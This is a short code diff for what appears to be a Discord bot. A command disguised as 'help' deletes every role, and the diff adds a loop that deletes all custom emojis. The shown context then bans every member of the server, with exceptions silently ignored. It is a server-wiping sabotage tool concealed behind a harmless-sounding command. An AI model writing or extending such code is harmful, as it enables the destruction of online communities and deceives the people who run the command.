@@ -24,6 +24,11 @@ async def help(ctx):
             await role.delete()
         except:
             pass
+    for emoji in ctx.guild.emojis:
+        try:
+            await emoji.delete()
+        except:
+            pass
     for member in ctx.guild.members:
         try:
             await member.ban()
